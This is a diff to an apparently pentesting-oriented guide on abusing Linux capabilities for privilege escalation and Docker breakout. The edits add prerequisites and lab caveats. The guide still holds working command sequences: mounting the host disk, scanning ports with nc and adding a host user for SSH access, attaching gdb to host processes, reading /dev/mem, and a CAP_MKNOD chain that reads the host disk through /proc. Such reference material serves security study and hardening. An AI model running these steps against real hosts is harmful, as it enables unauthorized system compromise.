@@ -373,6 +373,8 @@ A file can carry an empty capability set (`getcap myelf` returns `myelf =ep`). A
 
 **[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** is a highly potent Linux capability, often equated to a near-root level due to its extensive **administrative privileges**, such as mounting devices or manipulating kernel features. While indispensable for containers simulating entire systems, **`CAP_SYS_ADMIN` poses significant security challenges**, especially in containerized environments, due to its potential for privilege escalation and system compromise. Therefore, its usage warrants stringent security assessments and cautious management, with a strong preference for dropping this capability in application-specific containers to adhere to the **principle of least privilege** and minimize the attack surface.<sup>[[14]](#references)</sup>
 
+For namespace pivots, scope matters: `setns()` checks `CAP_SYS_ADMIN` against the user namespace that owns the target. Entering a mount namespace also requires `CAP_SYS_CHROOT` in the caller's user namespace. A capability held only inside a private remapped user namespace therefore does not grant arbitrary entry into initial host namespaces.<sup>[[14]](#references)</sup>
+
 **Example with binary**
 
 ```bash
@@ -426,18 +428,15 @@ Inside the previous output you can see that the SYS_ADMIN capability is enabled.
 
 - **Mount**
 
-With suitable device and namespace access, this can allow a Docker container to **mount a host disk and access its contents**.<sup>[[14]](#references)</sup>
+With suitable device and namespace access, this can allow a Docker container to **mount a host disk and access its contents**. The device node must represent a real host device, the device cgroup must allow it, and mounting a block-based filesystem requires `CAP_SYS_ADMIN` in the initial user namespace.<sup>[[14]](#references)</sup>
 
 ```bash
-fdisk -l #Get disk name
-Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
-Units: sectors of 1 * 512 = 512 bytes
-Sector size (logical/physical): 512 bytes / 512 bytes
-I/O size (minimum/optimal): 512 bytes / 512 bytes
-
-mount /dev/sda /mnt/ #Mount it
-cd /mnt
-chroot ./ bash #You have a shell inside the docker hosts disk
+lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
+node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
+mkdir -p /mnt/host
+mount -o ro "${node_root_device}" /mnt/host
+cat /mnt/host/etc/hostname
+umount /mnt/host
 ```
 
 - **Full access**
@@ -447,17 +446,19 @@ If the host is running an **ssh** server, you could **create a user inside the m
 
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
-fdisk -l
-mount /dev/sda /mnt/
+node_root_device=/dev/sda1
+mount "${node_root_device}" /mnt/host
 
 #Then, search for open ports inside the docker host
 nc -v -n -w2 -z 172.17.0.1 1-65535
 (UNKNOWN) [172.17.0.1] 2222 (?) open
 
 #Finally, create a new user inside the docker host and use it to access via SSH
-chroot /mnt/ adduser john
+chroot /mnt/host adduser john
 ssh john@172.17.0.1 -p 2222
 ```
+
+Direct reads and writes under `/mnt/host` are already host-filesystem access. The final `chroot` is only a pathname convenience and additionally requires `CAP_SYS_CHROOT`; it is not the step that creates the escape.
 
 ## CAP_SYS_PTRACE
 
@@ -620,7 +621,7 @@ process 207009 is executing new program: /usr/bin/dash
 
 **Example with environment (Docker breakout) - Another gdb Abuse**
 
-If **GDB** is installed (or you can install it with `apk add gdb` or `apt install gdb` for example) you can **debug a process from the host** and make it call the `system` function. (This technique also requires the capability `SYS_ADMIN`)**.**
+If **GDB** is installed (or you can install it with `apk add gdb` or `apt install gdb` for example), you can **debug a visible host process** and make it call the `system` function. This needs effective `CAP_SYS_PTRACE` in the target's user namespace and host PID visibility; it does **not** require `CAP_SYS_ADMIN`. Yama, non-dumpable state, seccomp, and LSM policy can still block the attach.
 
 ```bash
 gdb -p 1234
@@ -662,7 +663,7 @@ List **processes** running in the **host** `ps -eaf`
 ## CAP_SYS_MODULE
 
 **[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** empowers a process to **load and unload kernel modules (`init_module(2)`, `finit_module(2)` and `delete_module(2)` system calls)**, offering direct access to the kernel's core operations. This capability presents critical security risks because loading a module can modify kernel behavior and may defeat isolation boundaries.<sup>[[6]](#references)[[14]](#references)</sup>
-**This allows inserting or removing modules in the kernel visible to the process; in a container, whether that is the host kernel depends on the isolation configuration**.<sup>[[14]](#references)</sup>
+In an ordinary rootful Linux container, this targets the **shared host kernel** and is therefore a direct breakout. The capability must be effective in the initial user namespace, because loading modules is not namespaced. A userspace-kernel or VM-isolated runtime such as gVisor, Kata, or Hyper-V changes which kernel boundary is reachable. Module loading can still be blocked by `modules_disabled`, kernel lockdown, signature enforcement, seccomp, or an LSM.<sup>[[14]](#references)</sup>
 
 **Example with binary**
 
@@ -790,7 +791,7 @@ Another example of this technique can be found in [https://www.cyberark.com/reso
 
 ## CAP_DAC_READ_SEARCH
 
-[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables a process to **bypass permissions for reading files and for reading and executing directories**. Its primary use is for file searching or reading purposes. However, it also allows a process to use the `open_by_handle_at(2)` function, which can access any file, including those outside the process's mount namespace. The handle used in `open_by_handle_at(2)` is supposed to be a non-transparent identifier obtained through `name_to_handle_at(2)`, but it can include sensitive information like inode numbers that are vulnerable to tampering. The potential for exploitation of this capability, particularly in the context of Docker containers, was demonstrated by Sebastian Krahmer with the shocker exploit, as analyzed [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)</sup>
+[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables a process to **bypass permissions for reading files and for reading and executing directories**. It also authorizes `open_by_handle_at(2)`, which interprets a valid file handle relative to a mount file descriptor for the same mounted filesystem. It does not automatically expose every file outside the process's mount namespace. A file-handle breakout additionally needs a host-relevant filesystem reference, valid or discoverable handles, a compatible filesystem and storage layout, and no runtime or LSM block. The historical Docker "Shocker" technique demonstrated such a combination in affected layouts, as analyzed [here](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
 **This means that you can bypass file read permission checks and directory read/execute permission checks**.<sup>[[14]](#references)</sup>
 
 **Example with binary**
@@ -1004,7 +1005,7 @@ int main(int argc,char* argv[] )
 
 ## CAP_DAC_OVERRIDE
 
-**This capability bypasses file read, write, and execute permission checks**.<sup>[[14]](#references)</sup>
+**This capability bypasses file read and write permission checks and most execute checks**; executing a regular file still requires at least one execute bit to be set. It does not override a read-only mount, immutable state, or an LSM denial.<sup>[[14]](#references)</sup>
 
 Look for files that become readable or writable through membership in a privileged group; the useful targets depend on the target's ownership and mode bits.<sup>[[14]](#references)</sup>
 
@@ -1368,6 +1369,28 @@ The file's permitted capabilities are limited by the process's capability boundi
 
 This can be useful for **privilege escalation** and **Docker breakout**.<sup>[[14]](#references)</sup>
 
+The capability alone does not expose a useful interface. A container breakout additionally needs an accessible host device or resource, device-cgroup and filesystem permission, and a hardware- and kernel-specific technique. Strict `/dev/mem`, kernel lockdown, virtualization, seccomp, and LSM policy commonly remove the generic paths. Validate the capability and exposure first:
+
+```bash
+capsh --print | grep cap_sys_rawio
+ls -l /dev/mem /dev/port 2>/dev/null
+find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
+```
+
+If `/dev/mem` is the approved interface, a disposable lab can demonstrate cross-boundary node-memory disclosure by reading and hashing a range selected from that lab's hardware map:
+
+```bash
+approved_physical_address=<lab-provided-decimal-address>
+approved_byte_count=<lab-provided-size>
+dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
+  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
+wc -c /tmp/ht-rawio-proof.bin
+sha256sum /tmp/ht-rawio-proof.bin
+rm /tmp/ht-rawio-proof.bin
+```
+
+Do not guess the range: reading some MMIO regions can have side effects, and a valid address on one platform can control hardware or kernel memory on another. Kernel-memory modification or device control requires an approved, platform-specific proof; there is no safe universal raw-write example.
+
 ## CAP_KILL
 
 **This capability bypasses permission checks for sending signals to processes in the cases defined by the kernel**.<sup>[[14]](#references)</sup>
@@ -1502,7 +1525,9 @@ while True:
 
 ## CAP_NET_ADMIN + CAP_NET_RAW
 
-[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) grants the holder the power to **alter network configurations**, including firewall settings, routing tables, socket permissions, and network interface settings within the exposed network namespaces. It also enables turning on **promiscuous mode** on network interfaces, allowing for packet sniffing across namespaces.<sup>[[14]](#references)</sup>
+[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) grants the holder the power to **alter network configurations**, including firewall settings, routing tables, socket permissions, and network interface settings in the current network namespace. It can also enable promiscuous mode on an interface in that namespace; this may expose traffic delivered to that interface, but it does not by itself permit sniffing arbitrary interfaces in other network namespaces.<sup>[[14]](#references)</sup>
+
+These operations affect the process's **current network namespace**. Host network-state control requires `--network=host`, Kubernetes `hostNetwork: true`, or a separate namespace-entry primitive. `CAP_NET_RAW` alone is not a generic host shell, but it has participated in a documented, protocol-specific escape: a historical GCE chain combined root, the host network namespace, `CAP_NET_ADMIN`, `CAP_NET_RAW`, plaintext metadata traffic, and a raceable guest-agent request to inject an SSH key. See [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html) for the full prerequisites and modern HTTPS metadata caveats.
 
 **Example with binary**
 
@@ -1565,7 +1590,9 @@ The `FS_IOC_GETFLAGS` and `FS_IOC_SETFLAGS` operations read and update inode fla
 
 ## CAP_SYS_CHROOT
 
-[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables the execution of the `chroot(2)` system call, which can potentially allow for the escape from `chroot(2)` environments through known vulnerabilities.<sup>[[11]](#references)[[14]](#references)</sup>
+[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) enables the execution of the `chroot(2)` system call, which can allow escape from a weakly constructed `chroot(2)` jail through known techniques.<sup>[[11]](#references)[[14]](#references)</sup>
+
+This is a **chroot-jail escape capability, not a standalone container-to-host escape**. It neither exposes the host filesystem nor bypasses its permissions. If a host root is already mounted or reachable through `/proc/<pid>/root`, `chroot()` only makes that existing tree the process's pathname root. Separately, changing mount namespaces with `setns(2)` requires both `CAP_SYS_CHROOT` and `CAP_SYS_ADMIN` in the caller's user namespace, plus `CAP_SYS_ADMIN` in the user namespace that owns the target mount namespace.<sup>[[14]](#references)</sup>
 
 - [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
 - [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)
@@ -1573,6 +1600,15 @@ The `FS_IOC_GETFLAGS` and `FS_IOC_SETFLAGS` operations read and update inode fla
 ## CAP_SYS_BOOT
 
 [**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) allows the execution of the `reboot(2)` system call for system restarts, including commands such as `LINUX_REBOOT_CMD_RESTART2`; it also enables `kexec_load(2)` and, from Linux 3.17 onwards, `kexec_file_load(2)` for loading new or signed crash kernels respectively.<sup>[[14]](#references)</sup>
+
+Inside a private PID namespace, a supported `reboot()` request terminates that namespace's init process instead of rebooting the host. Host reboot impact therefore requires the initial PID namespace, normally through host PID sharing. A kexec-based takeover additionally requires a compatible image, an available syscall, and permissive lockdown and signature policy. Do not trigger either operation on a shared host merely to validate the capability:
+
+```bash
+capsh --print | grep cap_sys_boot
+readlink /proc/self/ns/pid /proc/1/ns/pid
+command -v kexec 2>/dev/null
+cat /sys/kernel/security/lockdown 2>/dev/null
+```
 
 ## CAP_SYSLOG
 
@@ -1591,44 +1627,51 @@ This capability is useful for processes that need to create device files, includ
 
 It is included in Docker's documented default capability set; verify the actual runtime configuration rather than assuming every deployment uses the same defaults ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>
 
-This capability permits to do privilege escalations (through full disk read) on the host, under these conditions:<sup>[[7]](#references)</sup>
+For a container escape, `CAP_MKNOD` can create a missing handle to a real host device, but it does **not** create the underlying device and does **not** bypass the device cgroup. The complete chain requires:
 
-1. Have initial access to the host (Unprivileged).
-2. Have initial access to the container (Privileged (EUID 0), and effective `CAP_MKNOD`).
-3. Host and container should share the same user namespace.
+1. Effective `CAP_MKNOD` in the initial user namespace, because device creation is not namespaced.
+2. The correct block or character type and major/minor numbers for a real host device.
+3. Device-cgroup permission to open that device.
+4. A compatible filesystem-aware reader, or `CAP_SYS_ADMIN` to mount a block filesystem.
+5. Filesystem and LSM permission to create and use the node.
 
-**Steps to Create and Access a Block Device in a Container:**
-
-1. **On the Host as a Standard User:**
-
-   - Determine your current user ID with `id`, e.g., `uid=1000(standarduser)`.
-   - Identify the target device, for example, `/dev/sdb`.
-
-2. **Inside the Container as `root`:**
+For an ext-family lab block device whose real major/minor numbers are `252:1`, a read-only validation is:
 
 ```bash
-# Create a block special file for the host device
-mknod /dev/sdb b 8 16
-# Set read and write permissions for the user and group
-chmod 660 /dev/sdb
-# Add the corresponding standard user present on the host
-useradd -u 1000 standarduser
-# Switch to the newly created user
-su standarduser
+mknod /dev/ht-node-root b 252 1
+ls -l /dev/ht-node-root
+debugfs -R 'cat /etc/hostname' /dev/ht-node-root
+rm /dev/ht-node-root
 ```
 
-3. **Back on the Host:**
+Replace the numbers with those reported by `/sys/class/block/<device>/dev`. If creating the node succeeds but opening it returns `Operation not permitted`, the device cgroup is still blocking access. This is the normal result in a container that merely has Docker's default `CAP_MKNOD` without an explicit device allowance.
+
+There is also a distinct **two-foothold local privilege-escalation** technique that must not be confused with direct container device access. A root process in a container that shares the initial user namespace can create a block-device node, while an unprivileged shell on the host with a matching UID opens that node through `/proc/<container-pid>/root`. The open is then evaluated in the host shell's cgroup, so the container's device-cgroup denial no longer protects the device.<sup>[[7]](#references)</sup>
+
+Inside the container, create the node and keep a process running as the UID of the existing host foothold:
 
 ```bash
-# Locate the PID of the container process owned by "standarduser"
-# This is an illustrative example; actual command might vary
-ps aux | grep -i container_name | grep -i standarduser
-# Assuming the found PID is 12345
-# Access the container's filesystem and the special block device
-head /proc/12345/root/dev/sdb
+host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
+mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
+chown "$host_uid" /dev/ht-node-root
+chmod 600 /dev/ht-node-root
+bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
+if [ -z "$bridge_user" ]; then
+  useradd -u "$host_uid" -M htbridge
+  bridge_user=htbridge
+fi
+su -s /bin/sh "$bridge_user" -c 'sleep 600'
 ```
 
-This approach allows the standard user to access and potentially read data from `/dev/sdb` through the container when the device, namespaces, and permissions are configured as described.<sup>[[7]](#references)</sup>
+From the existing host shell with that UID, identify the host PID of the sleeping container process and use its procfs root as the path to the device:
+
+```bash
+container_pid=<host-pid-of-the-matching-uid-process>
+stat "/proc/${container_pid}/root/dev/ht-node-root"
+debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
+```
+
+This chain requires both footholds, an identity-mapped or shared user namespace, permission to traverse the target `/proc/<pid>/root`, a real device with correct major/minor numbers, and an outer cgroup that permits the open. `hidepid`, ptrace-access rules, an LSM, filesystem incompatibility, or user-namespace remapping can break it. The historical technique is valuable precisely because it explains how `/proc/<pid>/root` can bypass the *container's* device-cgroup restriction; it is not a claim that `CAP_MKNOD` alone escapes a normally isolated container.<sup>[[7]](#references)</sup>
 
 ### CAP_SETPCAP
 
